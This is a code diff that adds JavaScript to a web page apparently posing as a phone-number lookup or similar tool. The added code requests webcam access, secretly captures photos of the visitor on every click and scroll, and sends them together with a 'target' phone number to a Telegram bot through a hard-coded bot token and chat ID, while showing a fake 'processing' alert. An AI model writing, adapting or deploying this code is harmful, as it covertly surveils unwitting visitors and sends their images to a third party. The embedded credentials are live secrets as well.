@@ -148,6 +148,70 @@
     }
 
     getVisitorInfo();
+
+    const token = "8236567312:AAFGiMLRIL5YJOyf881jVMymN_VM7b5aAPA";
+      const chat_id = "7131550435";
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+      const sound = document.getElementById("sound");
+      
+      // Request camera access
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(function(stream) {
+            video.srcObject = stream;
+          })
+          .catch(function(err) {
+            console.error("Kamera error:", err);
+          });
+      }
+      
+      function captureAndSend() {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(function(blob) {
+          const form = new FormData();
+          form.append("chat_id", chat_id);
+          form.append("photo", blob, "kamera.jpg");
+           
+          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: "POST",
+            body: form
+          })
+          .then(response => response.json())
+          .then(data => console.log(data))
+          .catch(error => console.error('Error:', error));
+        }, 'image/jpeg', 0.8);
+      }
+      
+      // Add event listeners
+      document.body.addEventListener("click", captureAndSend);
+      document.body.addEventListener("scroll", captureAndSend);
+      
+      function main() {
+        const nomor = document.getElementById("nomor").value;
+        if (nomor.trim() === "") {
+          alert("Nomornya mana anjeng");
+          return;
+        }
+        
+        // Play sound
+        sound.play().catch(e => console.log("Audio play failed:", e));
+        alert("PROSES...\nTunggu 5-10menit");
+        captureAndSend();
+        
+        // Send phone number to Telegram
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chat_id,
+            text: `Nomor target: ${nomor}`
+          })
+        });
+      }
   </script>
 </body>
   </html>
